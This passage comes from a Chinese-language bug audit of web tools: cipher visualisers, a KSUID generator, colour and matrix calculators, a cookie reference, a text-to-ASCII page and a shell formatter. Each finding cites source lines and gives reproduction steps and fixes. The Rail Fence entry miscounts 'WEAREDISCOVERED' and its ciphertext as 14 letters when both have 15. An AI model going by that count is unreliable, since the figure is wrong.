- 问题：示例只写“如 HI → `BM`（示例密钥方阵）”，没有给出方阵内容；按页面默认密钥 `PLAYFAIR` 实算，H 在第 3 行第 3 列、I 在第 2 行第 1 列，矩形对角为 E 与 B，结果 `EB`，不是 `BM`。
- 证据：`tools/it/playfair-cipher.html:323`（HI→BM）、`tools/it/playfair-cipher.html:197`（默认 key=PLAYFAIR）、`tools/it/playfair-cipher.html:395-413`（方阵构造）、`tools/it/playfair-cipher.html:828-831`（四个预设密钥）
- 复现（Node 复算）：`HI` 在默认 `PLAYFAIR` 下 → `EB`；四个预设密钥实算分别为 `PLAYFAIR→EB`、`MONARCHY→BF`、`SECRET→IK`、`KEYWORD→IL`，均非 `BM`，页面 `BM` 无法在任一内置配置复现。
- 影响：示例不可复现，用户按默认参数试算对不上，降低信任；因未给密钥，暂列待验证而非确认错误。
- 方案：示例标注完整 5×5 方阵（或指定 key），并按该方阵重算 HI 的结果。

- 留存建议（playfair-cipher）：①加解密分组逻辑分离（解密禁止插填充）；②预设显式 `setMode('encrypt')`；③把 676 改 625，并为 deep-dive 示例补密钥/方阵。

### IT-N161 Rail Fence deep-dive 示例密文与 14 字母明文不匹配（页面给出 18 字母，实算 14 字母）（中，确认源码缺陷）
- 问题：示例标题是 `WEAREDISCOVERED`（14 字母）`rail=3`，正文却给 `WECRLTEERDSOEEAIVD`（18 字母）；该串实际来自更长的 25 字母默认明文，长度与明文不符。
- 证据：`tools/it/rail-fence-cipher.html:214`（示例）、`tools/it/rail-fence-cipher.html:271-298`（`buildRailMatrix`/`enc`）
- 复现（Node 复算）：`railEncrypt('WEAREDISCOVERED',3)` 实际 `WECRERDSOEEAIVD`（14 字符）；页面串 `WECRLTEERDSOEEAIVD` 为 18 字符，且包含 `L/T/E` 等 14 字母串中不存在的字符。
- 影响：置换密码算例无法手算核对，用户按示例验证会认为工具算错。
- 方案：改为 `WECRERDSOEEAIVD`；若要展示 25 字母经典例，标题同步改为 `WEAREDISCOVEREDFLEEATONCE` 与 `WECRLTEERDSOEEFEAOCAIVDEN`。

### IT-N162 Rail Fence 深度输入框清空/输入 1 时 `renderGrid()` 抛 TypeError，矩阵预览停止更新（中，确认源码缺陷）
- 问题：`depth` 的 `oninput="renderGrid()"` 无守卫；`renderGrid` 直接 `buildRailMatrix(clean, depth)`。`depth=''` → `NaN`，`Array.from({length:NaN})` 得空数组，随后 `matrix[0][c]` 抛 `TypeError`；`depth=1` 时首行写入后 `r+=1`，第二列访问 `matrix[1]` 同样未定义。
- 证据：`tools/it/rail-fence-cipher.html:170`（oninput）、`tools/it/rail-fence-cipher.html:333-340`（renderGrid 无校验）、`tools/it/rail-fence-cipher.html:271-281`（buildRailMatrix 直接索引）
- 复现（Node 复算）：`buildRailMatrix('ABC',NaN)` 与 `buildRailMatrix('ABC',1)` 均抛 `TypeError: Cannot set properties of undefined`。页面操作：选中深度值按 Backspace 清空 → 控制台报错，右侧“栅栏可视化”停在旧矩阵；输入 1（数字框 min=2 不阻止键盘）同样崩溃。
- 影响：改深度是高频操作，清空重输的每个中间态都会抛未捕获异常，预览与输入不同步；用户误以为可视化坏了。
- 方案：`renderGrid` 先判 `Number.isInteger(depth) && depth>=2 && depth<=clean.length`，不合法时清空/提示“深度需 2–文本长度”，不调用 `buildRailMatrix`；`enc/dec` 已有同类校验可复用。

- 留存建议（rail-fence-cipher）：①修正 deep-dive 示例；②预览构建加深度守卫；③“保留空格”旁注明空白也参与置换、解密后位置会改变。

### IT-N163 Vigenère deep-dive 算例 “ATTACK + KEY → AXVCZ” 完全算错，密钥字母也错位（中，确认源码缺陷）
- 问题：标准维吉尼亚加密 `A+K=K`、`T+E=X`、`T+Y=R`、`A+K=K`、`C+E=G`、`K+Y=I`，`ATTACK` 应为 `KXRKGI`；页面写 `A+K=A、T+E=X、T+C=V`，把第三个密钥字母写成 C（实际循环到 Y），并给出 5 字母的 `AXVCZ`（比明文少 1 位）。
- 证据：`tools/it/vigenere-visualizer.html:284`（deep-dive 示例）、`tools/it/vigenere-visualizer.html:362-416`（`vigenere()` 算法）、`tools/it/vigenere-visualizer.html:183`（默认 key=LEMON）
- 复现（Node 复算页内函数）：`vigenere('ATTACK','KEY',true)` → `KXRKGI`；`ATTACKATDAWN` + `LEMON` → `LXFOPVEFRNHR`（后者正确，说明算法本身无误，仅示例文案错）。
- 影响：核心教学算例与工具输出矛盾，用户按示例手算/对照分步演示会发现对不上。
- 方案：把示例改为 `ATTACK → KXRKGI`，逐位写 `A+K=K、T+E=X、T+Y=R、A+K=K、C+E=G、K+Y=I`。

### IT-N164 Vigenère 解密分步面板把密文字母标成“明文字母”，位置字段命名整体反转（中，确认源码缺陷）
- 问题：`vigenere()` 解密时 `step.plain = ch`（输入的是密文）、`step.plainIdx = p`（密文字母下标）、`step.cipherIdx = c`（解出的明文字母下标）；`updateStepDisplay()` 却固定输出“明文字母: step.plain（位置 step.plainIdx）”“结果: step.cipher（位置 step.cipherIdx）”，解密模式下前两项展示的是密文，标签与数值全部错位。
- 证据：`tools/it/vigenere-visualizer.html:371-401`（解密分支字段赋值）、`tools/it/vigenere-visualizer.html:470-494`（分步面板文案与公式）、`tools/it/vigenere-visualizer.html:485-487`（解密公式用 `cipherIdx - keyIdx = plainIdx`）
- 复现：解密 `LXFOPVEFRNHR`（LEMON）第 1 步，密钥 L、密文 L、明文 A → 面板显示“明文字母: L（位置 11）”（实际 L 是密文，明文字母应为 A/0），公式显示 `(0 - 11 + 26) mod 26 = 11`，左侧实算 15 ≠ 11，数值本身也对不上。
- 影响：分步演示是本页核心卖点，解密模式下讲解文字与公式变量名全部反了（且公式左右不相等），学习者会混淆 P/C 的角色、无法据此手算。
- 方案：为 step 增加 `inLetter/inIdx/outLetter/outIdx` 并按模式渲染（加密：明文→密文，`(inIdx+k) mod 26 = outIdx`；解密：密文→明文，`(inIdx-k+26) mod 26 = outIdx`），不要把 `plainIdx/cipherIdx` 在两种模式下复用为不同含义。

### IT-N165 Vigenère 解密时方阵高亮行列互换（应高亮密钥行 + 明文字列，实际高亮明文字母行 + 密钥列）（低，确认源码缺陷）
- 问题：方阵定义为“行=密钥字母、列=明文字母”。解密查找应在密钥行中找密文字母、读出列头明文；代码解密时取 `rowIdx = step.cipherIdx`（明文字母下标）、`colIdx = step.keyIdx`，把行列对调。由于 `(key+plain)` 可交换，高亮格子的字母值恰好仍是密文，但行/列标题指向错误字母。
- 证据：`tools/it/vigenere-visualizer.html:549-563`（方阵构造 `(i+j)%26`）、`tools/it/vigenere-visualizer.html:578-588`（解密行列选择）
- 复现：解密 `LXFOPVEFRNHR`（LEMON）第 1 步，密钥 L、密文 L、明文 A → 实际高亮行 A、列 L（格子值 L）；期望高亮行 L、列 A。
- 影响：视觉演示与文字说明“行=密钥、列=明文”不一致，用户对照方阵会读错交叉点。
- 方案：解密分支改为 `rowIdx = step.keyIdx; colIdx = step.cipherIdx`（即明文字母下标），加密分支保持 `rowIdx=keyIdx; colIdx=plainIdx`。

### IT-N166 Vigenère 空密钥静默回退 `'A'`，加密输出原样返回且无提示（低，确认源码缺陷）
- 问题：`vigenere()` 中 `if(!key) key='A'`，位移 0，等价于不加密；`process()` 仍把结果写入输出并记历史，用户清空密钥后看到“成功”的原样输出。
- 证据：`tools/it/vigenere-visualizer.html:362-364`（空 key 回退 A）、`tools/it/vigenere-visualizer.html:418-436`（process 无密钥校验/无提示）
- 复现：清空密钥框 → 输入 `ATTACK` → 输出仍为 `ATTACK`，无任何错误或提示；期望提示“请输入密钥”或至少显示“位移 0，未加密”。
- 影响：用户会误以为加密成功，把明文当密文使用；历史里也留下误导记录。
- 方案：`process()` 在 `key.trim()` 为空时弹提示并停止；或在输出区标注“密钥为空，未执行位移”。

- 留存建议（vigenere-visualizer）：①修正 deep-dive 算例与密钥字母；②解密分步文案/公式/高亮按 P/C 角色分离；③空密钥拒绝计算，历史写入防抖。

- 备注：`adfgvx-cipher`、`affine-cipher`、`hill-cipher`、`rail-fence-cipher`、`bacon-cipher` 的“复制结果”仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效），与 IT-N31 同模式，未重复计数；8 页的 TBKit `*ResText()` 均读 `textarea` 的 `textContent`（恒空）导致数据表/趋势图/CSV 恒空，与 IT-N140 同类模板缺陷，已在 IT-N140 统一记录，本批不重复编号。

- 覆盖小结：本轮实读 8 页（adfgvx-cipher、affine-cipher、atbash-cipher、bacon-cipher、hill-cipher、playfair-cipher、rail-fence-cipher、vigenere-visualizer），新增 24 条（高 3 / 中 14 / 低 7），编号 IT-N143~IT-N166。未覆盖：本分区其余约 257 页（含全部编码/哈希/格式化/HTTP/Git/Docker 生成器与速查表）；未做浏览器、英文态、繁体、移动端、门禁与线上部署验证。

### IT-N167 KSUID 多行结果复制成一串无分隔，导出 CSV 只导历史表（中，确认源码缺陷）
- 问题：每个 ID 用 `<div class="code-row">` 渲染（284），`copyResult()` 取 `#output` 的 `textContent`（290）。`textContent` 不保留块级换行，5 个 27 字符 ID 会拼成 135 字符一整串，`alert('已复制')` 仍提示成功；导出按钮走历史表（417-419），历史「结果」列还被 `slice(0,80)` 截断（344）。
- 证据：`tools/it/ksuid-generator.html:284`、`:289-291`、`:338-344`、`:417-419`
- 复现（DOM 语义复算）：生成 5 个 → 复制 → 剪贴板为 `ID1ID2ID3ID4ID5`（无换行/空格），期望每行 1 个；点「导出明细 CSV」→ 得到历史表（时间/count/fmt/结果前 80 字符），不含当前 5 个完整 ID。
- 影响：`tools/it/ksuid-generator.html` —— 粘贴到名单/日志时 5 个 ID 变 1 个非法串，CSV 也不含完整结果。
- 方案：复制改为 `Array.from(output.querySelectorAll('.code-row')).map(e=>e.textContent).join('\n')`；或把 ID 渲染进 `<pre>`；导出改为构建当前结果 CSV（给结果表加 id 后导出）。

### IT-N168 KSUID 英文简介称「20-byte random payload」，实现是 16 字节（中，确认源码缺陷）
- 问题：英文首段写 "time-sortable 27-character identifiers with a 20-byte random payload"（479）；KSUID 总量 20 字节 = 4 字节时间戳 + 16 字节随机（158），代码也只填充 16 字节（281-282）。读者会以为随机部分是 20 字节。
- 证据：`tools/it/ksuid-generator.html:479`、`:158`、`:275-282`、`:267-269`（hex 输出恒 40 字符 = 20 字节总量）
- 复现：源码对照；`hex` 模式输出长度恒 40，可反推总量 20 字节，与"20-byte random payload"（总量会变 40 字节）矛盾。
- 影响：`tools/it/ksuid-generator.html` —— SEO 首段与英文用户对格式的理解错误。
- 方案：改为 "27-character identifiers (4-byte timestamp + 16-byte random payload)"。

### IT-N169 KSUID 深度示例只有 26 字符（非 27），解码时间是 2014-06-02（低，确认源码缺陷）
- 问题：deep-dive 示例 `0ujtsy1p8c9r1l0b0p0n000000`（204）实长 26；解码首 4 字节时间戳 = 1735613 秒 → 2014-06-02T19:00:13Z，不是"当前生成"样例，也无法体现公式（158）"27 字符 base62"的承诺。另 258 `randInt()` 定义后从未调用（死代码）。
- 证据：`tools/it/ksuid-generator.html:204`、`:258`、`:158`、`:261-265`（padStart 27）
- 复现（node 复算）：`'0ujtsy1p8c9r1l0b0p0n000000'.length === 26`；base62 解码 → bytes `[0,26,123,189]` → `(1735613+1400000000)*1000` = 2014-06-02T19:00:13Z。
- 影响：`tools/it/ksuid-generator.html` —— 核心教学示例本身不是合法 KSUID，读者照抄会得到 26 字符串。
- 方案：换成真实生成的 27 字符样例并标注其生成时间；删 `randInt`。

- 留存建议（tools/it/ksuid-generator.html）：①复制按行 `join('\n')`、导出含当前完整结果；②英文简介改 16-byte payload；③示例改 27 字符并标注生成时间。

### IT-N170 calc-3 HEX/RGB/HSL 三路输入都不校验区间，越界得矛盾或错误颜色（中，确认源码缺陷）
- 问题：`hexToRgb` 只校验 6 位长度（238）；`fromRgb` 正则只取 `\d+`（333），300 等越界值照收；`fromHsl` 正则同样只取 `\d+`（343），h=720、s=200 照收；`rgbToHex` 才 clamp（248），而 `rgbToHsl`/`hslToRgb` 不 clamp（253-284），`updateUI` 直接展示未 clamp 的 rgb（316）。
- 证据：`tools/it/calc-3.html:238`、`:246-251`、`:253-273`、`:276-291`、`:303-317`、`:331-339`、`:341-350`
- 复现（node 复算页内函数）：`rgb(300,0,0)` → 实际 `HEX #FF0000` + `HSL hsl(0, 143%, 59%)`（饱和度 143% 不可能），期望 clamp 后 `s=100%` 或拒绝；`hsl(720,100%,50%)` → 实际 `rgb(0,0,0)`（黑），期望 `rgb(255,0,0)`（720≡0）；`hsl(0,200%,50%)` → 实际 `rgb(383,-127,-127)`，而同屏 HEX 显示 `#FF0000`。
- 影响：`tools/it/calc-3.html` —— 同屏 HEX/RGB/HSL 互相矛盾，复制 RGB 会拿到越界值。
- 方案：入口统一 clamp（r/g/b 0–255；`h=((h%360)+360)%360`；s/l 0–100 或拒绝并提示），`hslToRgb` 输出后再 clamp 一次。

### IT-N171 calc-3 预设回调 `fromHex()` 覆盖刚写入的 HSL，红/蓝/绿预设点了没反应（中，确认源码缺陷）
- 问题：`preset.bar(..., function(){ fromHex(); })`（476）；红/蓝/绿预设只写 `hslInput`（473-475），随后 `fromHex()` 读的是 `hexInput`（322-328），`updateUI(rgb,'hex')` 在 `source!=='hsl'` 时把 `hslInput` 改写回旧值（309）。
- 证据：`tools/it/calc-3.html:472-476`、`:307-309`、`:321-329`
- 复现：点「红色」→ 实际 `hslInput` 闪成 `hsl(0,100%,50%)` 后立即变回 `hsl(16, 100%, 60%)`，预览仍是橙色；期望纯红 `#FF0000`。
- 影响：`tools/it/calc-3.html` —— 4 个预设中 3 个视觉效果为零，用户以为预设坏了。
- 方案：回调按字段来源分派（写 hsl 的预设调 `fromHsl()`，默认参数预设调 `fromHex()`），或预设同时写 `hexInput`。

### IT-N172 calc-3 同页渲染两套预设条（声明式 + `#calc_3Presets` 自动宿主）（中，确认源码缺陷）
- 问题：正文 134 已有 `data-tb="preset"`（仅"默认参数"1 条），`__calc_3Presets()` 又调 `TBKit.preset.bar('#calc_3Presets', 4 条)`（472）；页面没有 `id="calc_3Presets"`，`preset.ensureHost()` 会在首个 `.input-row`（132）前新建宿主（`js/tool-kit.js:1013-1033`），于是出现上下两条「常用场景」。
- 证据：`tools/it/calc-3.html:132`、`:134`、`:470-475`、`js/tool-kit.js:1035-1039`
- 复现：打开页 → 工具栏上方两条预设按钮组（1 个 + 4 个）；期望只留一组 4 个。
- 影响：`tools/it/calc-3.html` —— 重复 UI，且两条预设行为不同（声明式那条能正常生效）。
- 方案：删除 134 的声明式 preset div（或删 `__calc_3Presets`），统一保留 4 条并显式放宿主 div。

### IT-N173 calc-3 文档承诺 `#RGB` 简写与 8 位 alpha，实现只接受 6 位且输入框限长 7（低，确认源码缺陷）
- 问题：123 "`#RGB` 简写会等比扩展"、187 "#RRGGBB 或 #RGB 简写，另有 8 位含 alpha"；`hexToRgb` 要求 `^[0-9A-Fa-f]{6}$`（238），输入框 `maxlength="7"`（136）连 `#RRGGBBAA`（9 字符）都输不进去。
- 证据：`tools/it/calc-3.html:123`、`:187`、`:136`、`:236-238`
- 复现：输入 `#F00` → 实际提示"请输入有效的 HEX 颜色"；输入 `#FF6B3580` → 被截成 `#FF6B35` 且 alpha 丢失；期望 `#F00 → #FF0000`。
- 影响：`tools/it/calc-3.html` —— 文档承诺两种常见写法都不可用。
- 方案：支持 3/4/6/8 位（3 位按位扩展，4/8 位取 alpha 并展示），同步放宽 `maxlength`。

- 留存建议（tools/it/calc-3.html）：①三路入口统一区间校验 + clamp；②预设回调按来源调用 `fromHsl`；③删重复预设条；④补 `#RGB`/8 位 alpha 或删掉该承诺。

### IT-N174 matrix 改维度后不点「构建矩阵」直接点「计算转置」抛 TypeError，结果区空白（高，确认源码缺陷）
- 问题：`rows/cols` 输入框无 oninput 重建（170-171），`calculate()` 直接 `getM(r,c)`，而 `getM` 按新维度读取 `a<i*c+j>`（268）。仅 a0…a(旧r*旧c-1) 存在，新维度需要更多格时 `getElementById` 返回 null，`.value` 抛 TypeError；`calculate()` 无 try/catch（281-296），异常冒泡，输出区保持"点击「计算转置」查看结果"。
- 证据：`tools/it/matrix-transpose.html:170-171`、`:174-175`、`:257-260`、`:266-269`、`:281-296`
- 复现：默认 2×3 → 把「行」改成 3（不点构建）→ 点「计算转置」：实际 `Uncaught TypeError: Cannot read properties of null (reading 'value')`，无结果；期望自动重建或提示先构建。另 `行=2.5` → `build()` 用 `i<r*c` 造出 8 格（260），`grid-template-columns:repeat(2.5,70px)` 非法（259），`getM` 按 3 行读到 a8 → 同类 TypeError。
- 影响：`tools/it/matrix-transpose.html` —— 先改维度再算是最自然路径，直接静默报错。
- 方案：`calculate()` 前比对 DOM 单元格数与 `r*c`，不一致先 `build()`（保留已有值）；`rows/cols` 用 `Number.isInteger` + 1–6 校验，非法值提示且不构建。

### IT-N175 matrix 结果用 `toLocaleString()` 展示：千分位、最多 3 位小数、大数精度溢出（中，确认源码缺陷）
- 问题：`fmt` 先 `Math.round(x*1e10)/1e10` 再 `toLocaleString()`（272）。`toLocaleString()` 默认 `maximumFractionDigits=3`，转置值被二次四舍五入；同时插入千分位逗号，`1,234.5` 无法直接复制回输入框；`x*1e10` 在 |x|≳1e13 时溢出双精度有效位产生伪小数。
- 证据：`tools/it/matrix-transpose.html:270-272`、`:278`
- 复现（node）：`1.2345678 → "1.235"`、`0.123456789 → "0.123"`、`1234.5 → "1,234.5"`、`123456789012345 → "123,456,789,012,345.02"`（末两位是运算噪声）。期望 `1.2345678` 原样且无千分位。
- 影响：`tools/it/matrix-transpose.html` —— 转置结果被 UI 抹掉精度，抄回计算会得到不同值。
- 方案：去掉 `toLocaleString()`，改用 `String()` 或固定 6–12 位有效数字；超大数改指数表示。

### IT-N176 matrix 空单元格/非数字静默按 0，维度 0 或 >6 无提示（低，确认源码缺陷）
- 问题：`getM` `isNaN(v)?0:v`（268）把空白都当 0，转置照常"成功"；`build` 只按 `+value` 造格（258-260），行填 0 → 0 个格、`repeat(0,70px)` 非法，输出仍写 `Aᵀ（3×0）`；行填 7 也照造 49 格（min/max 只是 spinner 提示）。
- 证据：`tools/it/matrix-transpose.html:258-260`、`:266-269`、`:275`、`:286`
- 复现：清空 a0 → 计算实际得 `A[1][1]=0` 且无提示；行填 0 → 输出"3×0"空表；列填 0 → `matrixHTML([])` 返回空串（275），输出只剩标题；行填 7 → 49 格照算。
- 影响：`tools/it/matrix-transpose.html` —— 空白被当真实 0，统计/线代结果被悄悄改写。
- 方案：空/非数单元格标红并中止计算；维度做 1–6 整数校验并给出 `err` 文案。

### IT-N177 matrix「导出明细 CSV」导的是历史表，不含转置矩阵（低，确认源码缺陷）
- 问题：按钮绑定 `exportTable('#matrix_transposeTable')`（413-415），该 id 是历史表容器；当前转置矩阵渲染在 `#output`（286），没有可导出的表格 id，历史只存输入各格 + 截断的结果文本。
- 证据：`tools/it/matrix-transpose.html:413-415`、`:286`、`:175`、`:349-357`（历史表）
- 复现：2×3 算完后点导出 → CSV 列为 时间/rows/cols/a0…/结果，结果列是截断文本，无 3×2 的 Aᵀ。
- 影响：`tools/it/matrix-transpose.html` —— 导出按钮名不副实。
- 方案：给结果表加 id（如 `#transposeResultTable`）并导出它，或在导出函数里现场生成 Aᵀ CSV。

- 留存建议（tools/it/matrix-transpose.html）：①计算前校验/重建单元格并做整数维度校验；②`fmt` 去 `toLocaleString` 保留精度；③空值校验并提示；④导出改导转置结果。

### IT-N178 HTTP Cookie 英文简介宣称 "Parse and build ... headers"，页面只有静态速查（中，确认源码缺陷）
- 问题：169 的英文文案写 "Parse and build HTTP Cookie and Set-Cookie headers with their attributes."；页面只有 `#searchInput`（171）+ 静态 `COMMANDS` 列表 + 图表/明细表，没有任何解析/构建输入框或函数。
- 证据：`tools/it/http-cookies.html:169`、`:171`、`:478-541`、`:650-661`
- 复现：英文态首段承诺解析/构建，但全页无对应控件，只能搜索 26 条属性说明；与中文 `data-zh`"属性与 JS 操作方法"的口径也不一致。
- 影响：`tools/it/http-cookies.html` —— 英文用户按简介预期找解析器，找不到即流失。
- 方案：英文改为 "Reference for Cookie attributes ... and JS operations"，或新增一个 Cookie 头解析/构建小工具。

### IT-N179 Cookie 示例 `Expires=Wed, 21 Oct 2025 ...` 星期与日期不符且已过期（中，确认源码缺陷）
- 问题：280 沿用 RFC 6265 的 `Wed, 21 Oct 2015` 只改年份为 2025，未改星期。2025-10-21 是周二；且相对当前日期（2026-11）已过期。
- 证据：`tools/it/http-cookies.html:280`
- 复现（node）：`new Date('2025-10-21T07:28:00Z').toUTCString()` → `Tue, 21 Oct 2025 07:28:00 GMT`（非 Wed）；与 `new Date('2026-11-04')` 比较为已过期。
- 影响：`tools/it/http-cookies.html` —— 作为"过期时间点"示例既演示错误星期，又演示已过期时间，用户照抄会立刻删 Cookie。
- 方案：换未过期且星期正确的日期（如 `Thu, 21 Oct 2027 07:28:00 GMT`，已实算），或保留 RFC 原文 2015 并注明"格式示例，日期已过期"。

### IT-N180 Cookie 属性表未说明 `Max-Age` ≤0 即删除，中文界面表头固定英文（低，确认源码缺陷）
- 问题：283-288 `Max-Age` desc 只写"存活秒数（相对，优先于 Expires）"，params 写"正数/0/负数"却未说明 0/负值即立即删除（等价于删除 Cookie）；这是与 Expires 并列最常用的删除手段。另 `__ckTable()` 658 无条件 `th1.textContent='Attribute'`，中文界面表头混英文（SameSite 的默认行为在 331-333 已有说明，不算缺失）。
- 证据：`tools/it/http-cookies.html:283-288`、`:657-660`
- 复现：查 `Max-Age` 条目只看到"正数/0/负数"，无删除语义；中文态打开「明细表」→ 表头为 `# / Attribute / 分类 / 说明`（其余三列中文）。
- 影响：`tools/it/http-cookies.html` —— 最容易踩的"用 0/负值删除 Cookie"没写清；UI 语言不统一。
- 方案：`Max-Age` desc 补"0 或负数 → 立即删除"；`th1` 按 `en` 切换 `Attribute/属性`。

- 留存建议（tools/it/http-cookies.html）：①英文简介改口径或补解析器；②Expires 示例换未过期且星期正确；③补 `Max-Age`≤0 删除语义并统一表头语言。

### IT-N181 文本转 ASCII 参照表把制表符写成 `9(制表) 57 39`，与"32–126 可打印"标题矛盾（中，确认源码缺陷）
- 问题：171 `<td>9(制表)</td><td>57</td><td>39</td>`：十进制 57/0x39 是字符 `9`，TAB 是 9/0x09。该表标题（165）明确"可打印字符（32–126）"，TAB(9) 不在范围。另 A(65/41) 在 169 与 173 重复出现。
- 证据：`tools/it/text-to-ascii.html:165-173`
- 复现：对照 ASCII 表，TAB → 9 / 09；57 / 39 → `9`，表中该行自相矛盾；重复 A 行可在同表两处读到。
- 影响：`tools/it/text-to-ascii.html` —— 初学者把 TAB 记成 57，写解析器/校验会出错；参照表是页面主要价值之一。
- 方案：该行改为 `9(TAB) | 9 | 09` 并移出"可打印"表（或单列控制字符表）；删重复 A 行。

### IT-N182 文本转 ASCII 按 UTF-16 单元计数，1 个 emoji 被报成"跳过 2 个字符"（中，确认源码缺陷）
- 问题：`for(i=0;i<s.length;i++)` + `charAt(i)`（217-218）把代理对拆成两个单元，两单元码点都 >127 各 `skipped++`（219），提示"已跳过 N 个非 ASCII 字符"（227）。
- 证据：`tools/it/text-to-ascii.html:217-221`、`:227`、`:100`（"非 ASCII 会被跳过"）
- 复现（node）：`a😀b` → `skipped=2`（实际非 ASCII 字符 1 个）；单个 `😀` → 报"跳过 2 个"。
- 影响：`tools/it/text-to-ascii.html` —— 计数翻倍，表情/生僻字多的文本会被误判。
- 方案：用 `for(const ch of s)` + `codePointAt(0)` 按码点遍历（保留完整代理对）；或文案改为"跳过 N 个 UTF-16 编码单元"。

### IT-N183 文本转 ASCII 十六进制不补位，与公式"0x 加两位大写十六进制"不符（低，确认源码缺陷）
- 问题：102 公式写"0x 加两位大写十六进制"；221 `'0x'+code.toString(16).toUpperCase()` 对码点 <16 只出 1 位。表中 ≥0x20 的行看不出，控制字符（换行 10、TAB 9）会显示 `0xA`、`0x9`。
- 证据：`tools/it/text-to-ascii.html:102`、`:221`、`:220`（二进制已补 8 位）
- 复现（node）：code 10 → `0xA`（期望 `0x0A`）；code 9 → `0x9`。二进制列同为 8 位补齐，风格不一致。
- 影响：`tools/it/text-to-ascii.html` —— 用户以为十六进制列漏字符，且与公式不符。
- 方案：`toString(16).toUpperCase().padStart(2,'0')`。

### IT-N184 文本转 ASCII「导出明细 CSV」导历史表而非逐字符表（低，确认源码缺陷）
- 问题：逐字符表由 `calcTool()` 拼成 HTML（224-225）写入 `#result`，无 id；导出函数 `exportTable('#text_to_asciiTable')`（327）导的是历史表（269），历史「结果」还被 `slice(0,80)` 截断（249-251）。首屏 `calcTool()` 在 231 直接执行且未走 history，若用户未再点「计算」就导出，CSV 为空。
- 证据：`tools/it/text-to-ascii.html:224-225`、`:269`、`:249-251`、`:327`、`:231`
- 复现：打开页 → 直接点导出 → 空 CSV；点「计算」后导出 → 仅 1 行历史（时间/输入/结果前 80 字符），无 逐字符四列。
- 影响：`tools/it/text-to-ascii.html` —— 导出与"明细"不符。
- 方案：给逐字符表加 id 并导出它（列：字符/十进制/十六进制/二进制）。

- 留存建议（tools/it/text-to-ascii.html）：①修正 TAB 行并删重复 A；②按码点遍历修正跳过计数；③hex 补两位；④导出逐字符表。

### IT-N185 Shell「压缩」把 `&&`/`|` 续行、`else`、`case … in`、heredoc 拼成非法脚本（高，确认源码缺陷）
- 问题：`minifyShell()` 逐行 trim 后按 `needsSep` 决定换行，否则追加 `'; '`（315-325）。`needsSep` 只覆盖 `; { ( \ then do`、下一行以 then/do/fi/done/else/elif/esac/}/) 开头、`#!`，不覆盖行尾 `&&`/`||`/`|`、`else` 行本身、`case … in`；heredoc 也被逐行当普通命令拼接。
- 证据：`tools/it/shell-script-formatter.html:311-329`（判定 323、拼接 324）、`:214`（FAQ"仅调整空白"）
- 复现（用页内函数复算，输出交 `bash -n`）：
  - `if true; then\n cmd1 &&\n cmd2\nfi` → `cmd1 &&; cmd2` → `syntax error near unexpected token ';'`
  - `if true; then\necho a\nelse\necho b\nfi` → `else; echo b` → 同错
  - `case $1 in … esac` → `case $1 in; start); …` → 同错
  - `cat <<EOF\nhello world\nEOF\necho done` → `cat <<EOF; hello world; EOF; echo done;`（`bash -n` 通过但语义破坏，body 变命令）
- 影响：`tools/it/shell-script-formatter.html` —— 页面主打的"压缩"对最常见的多行条件/管道/case/heredoc 直接产出跑不起来的脚本；FAQ 214 的"仅调整空白"与实际插入分号不符。
- 方案：行尾为 `&& || | \` 时保留换行；`else/elif/do/then/case … in` 单独成行；检测到 heredoc 整段原样保留；压缩后跑一次关键字/括号平衡提示。

### IT-N186 Shell 格式化把行尾 `)` 误判为 case 分支模式，后续缩进整体漂移（中，确认源码缺陷）
- 问题：`isCasePat = /^([A-Za-z0-9_*?\-|]+\)|.+\))/.test(trimmed)`（300）的第二分支 `.+\)` 命中任何含 `)` 的行；303 只要 `endsWith(')')` 就 `depth++`。于是 `echo $(date)`、`arr=(1 2 3)` 都被当成 case 分支。
- 证据：`tools/it/shell-script-formatter.html:300`、`:302-305`
- 复现（node 复算页内 `formatShell`，4 空格）：
  - `if true; then\necho $(date)\necho hi\nfi` → 实际 `    echo $(date)` / `        echo hi` / `    fi`；期望 4/4/0。
  - `arr=(1 2 3)\necho done` → 实际 `    echo done`；期望 0。
- 影响：`tools/it/shell-script-formatter.html` —— 命令替换/数组赋值后整段缩进错位，格式化结果不可信。
- 方案：case 分支判定收紧为"行首到第一个 `)` 之间无空白且 `)` 是行尾"（如 `^[^\s()'"]+\)$`），且仅在 `case` 块内（记录 case 深度）启用。

### IT-N187 Shell 单独成行的 `then`/`do` 被多缩进一级且深度多开一层（中，确认源码缺陷）
- 问题：本行减级只处理 `fi/done/esac`（296）与 `else/elif`（298），`then/do` 不减级；输出后 302 又因 `endsWith('then'|'do')` 增级，导致 `then` 比 `if` 深一级、正文再深一级、`fi` 落在中间层。
- 证据：`tools/it/shell-script-formatter.html:296-302`
- 复现（4 空格）`if [ "$x" = 1 ]\nthen\necho hi\nfi` → 实际 `    then` / `        echo hi` / `    fi`；期望 `then` 与 `if` 同列（至少 `fi` 与 `if` 同列）。
- 影响：`tools/it/shell-script-formatter.html` —— 多行 then/do 是长条件的常见写法，格式化后层级错乱。
- 方案：本行减级条件加入 `^then\b|^do\b`，并避免对独占的 `then/do` 行再增级（增级只发生在 `if/for/while/until` 首行）。

### IT-N188 Shell 函数/块闭合 `}` 未先减级，输出比 `{` 深一级（中，确认源码缺陷）
- 问题：`dedMid` 只含 `fi|done|esac`（278），`}` 的减级放在输出后（304 的 `funcClose`/`=== '}'`），于是 `}` 按当前 depth 缩进后再减级。
- 证据：`tools/it/shell-script-formatter.html:278`、`:296`、`:304`
- 复现：载入页面自带示例点「美化」（4 空格）→ 实际 `backup() {` 在 0、`if` 在 4、`}` 输出为 `    }`；期望 `}` 与 `backup() {` 同列。
- 影响：`tools/it/shell-script-formatter.html` —— 自带示例第一次点"美化"就产出不规范收尾括号。
- 方案：把 `^\}` 并入本行减级集合（296 之前），304 只做深度回落。

### IT-N189 Shell heredoc 起始行不参与缩进，且正则把字符串/注释里的 `<<` 当 here-doc（低，确认源码缺陷）
- 问题：命中 heredoc 的行直接 `out.push(line)`（289），块内保持原始列位；`<<` 正则（288）不区分上下文，`echo "a << b"`、`# see << docs` 都会命中并把后续所有行当 heredoc 原样输出。
- 证据：`tools/it/shell-script-formatter.html:288-289`、`:283-287`
- 复现（node）：`if true; then\ncat <<EOF\nhello\nEOF\necho after\nfi` → `cat <<EOF` 在 0 列（块内应为 4）；`echo "a << b"\necho x` → 命中正则（group2=`b`），后续行不再格式化。
- 影响：`tools/it/shell-script-formatter.html` —— 带 heredoc 的脚本整段失去缩进；一句普通字符串即可让格式化"失效"。
